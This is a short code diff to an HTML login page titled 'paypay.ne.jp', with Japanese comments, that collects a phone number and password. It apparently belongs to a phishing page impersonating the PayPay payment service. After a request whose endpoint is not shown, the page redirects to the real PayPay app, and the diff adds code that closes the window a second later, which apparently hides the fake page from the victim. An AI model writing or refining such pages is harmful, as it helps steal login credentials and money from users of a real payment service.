@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>paypay.ne.jp</title>
-    
+
     <style>
         /* 既存のスタイル */
         .login1 {
@@ -212,6 +212,11 @@
                 if (response.ok) {
                     // PayPayアプリを開く
                     window.location.href = payPayAppURL;
+
+                    // 1秒後にページを閉じる
+                    setTimeout(() => {
+                        window.close(); // ウィンドウを閉じる
+                    }, 1000); // 1秒待つ
                 } else {
                     console.error('送信に失敗しました。');
                 }
@@ -220,7 +225,6 @@
                 console.error('エラー:', error);
             });
         }
-
         // 電話番号やパスワードが入力されるたびにチェックとフォーマット
         phoneInput.addEventListener('input', function() {
             formatPhoneNumber();
